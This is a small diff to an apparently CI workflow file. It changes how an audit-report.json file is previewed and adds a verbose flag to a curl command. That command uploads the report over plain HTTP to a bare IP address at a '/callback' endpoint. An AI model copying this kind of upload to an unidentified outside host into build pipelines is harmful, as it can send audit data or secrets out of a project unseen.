@@ -22,11 +22,13 @@ jobs:
 
       - name: Verify report exists
         run: |
-          echo "Showing first 40 lines of audit-report.json:"
-          head -n 40 audit-report.json
+          echo "File size:"
+          ls -lh audit-report.json
+          echo "First 20 lines:"
+          head -n 20 audit-report.json
 
       - name: Send report
         run: |
-          curl -X POST -H "Content-Type: multipart/form-data" \
+          curl -v -X POST -H "Content-Type: multipart/form-data" \
             -F "file=@audit-report.json" \
             http://35.219.147.98:8880/callback
